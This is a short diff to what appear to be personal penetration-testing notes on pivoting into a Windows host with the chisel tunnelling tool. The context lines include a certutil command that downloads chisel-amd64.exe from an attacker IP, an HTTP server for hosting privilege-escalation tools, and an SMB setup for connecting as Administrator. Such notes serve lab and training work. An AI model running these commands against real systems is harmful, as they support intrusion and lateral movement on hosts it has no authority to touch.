@@ -23,6 +23,7 @@ Easy Windows Chisel
 netstat -nat | findstr LISTEN | findstr 127 
 127.0.0.1:8080 LISTENING 
 
+Share
 cd ~/tools/privesc_windows  
 python3 -m http.server 80
 certutil -urlcache -split -f http://192.168.162.46:80/chisel-amd64.exe  
@@ -51,3 +52,6 @@ sudo vim /etc/samba/smb.conf
 min protocol = SMB2 
 sudo /etc/init.d/smbd restart 
 smbclient -L 127.0.0.1 -U Administrator 
+
+---------------------
+Consider: mxtransfer
